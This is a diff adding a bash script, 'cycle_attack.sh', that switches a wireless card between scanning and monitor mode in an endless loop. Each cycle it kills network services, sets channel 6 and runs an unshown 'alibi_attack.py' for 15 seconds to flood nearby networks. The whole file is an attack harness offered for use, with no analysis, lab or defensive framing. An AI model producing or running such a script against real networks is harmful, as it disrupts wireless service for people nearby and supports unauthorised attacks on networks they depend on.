@@ -1,0 +1,41 @@
+cat > cycle_attack.sh << 'EOF'
+#!/bin/bash
+IFACE="wlan0"
+MON_IFACE="wlan0mon"
+CHANNEL=6
+PROBE_DURATION=15
+SEARCH_DURATION=10
+ATTACK_SCRIPT="./alibi_attack.py"
+
+cleanup() {
+    echo -e "\n[*] Cleaning up, restoring managed mode..."
+    sudo airmon-ng stop "$MON_IFACE" 2>/dev/null
+    sudo systemctl restart NetworkManager
+    exit 0
+}
+trap cleanup SIGINT SIGTERM
+
+while true; do
+    echo "============================================"
+    echo "[SEARCH] Scanning in managed mode for ${SEARCH_DURATION}s..."
+    echo "============================================"
+    sudo systemctl restart NetworkManager
+    sleep 3
+    timeout "$SEARCH_DURATION" sudo iw dev "$IFACE" scan | grep -E "SSID|BSS "
+
+    echo ""
+    echo "============================================"
+    echo "[PROBE] Switching to monitor mode, flooding for ${PROBE_DURATION}s..."
+    echo "============================================"
+    sudo airmon-ng check kill
+    sudo airmon-ng start "$IFACE"
+    sudo iw dev "$MON_IFACE" set channel "$CHANNEL"
+    timeout "$PROBE_DURATION" sudo python3 "$ATTACK_SCRIPT"
+    sudo airmon-ng stop "$MON_IFACE"
+
+    echo "[*] Cycle complete. Looping..."
+    sleep 2
+done
+EOF
+
+chmod +x cycle_attack.sh
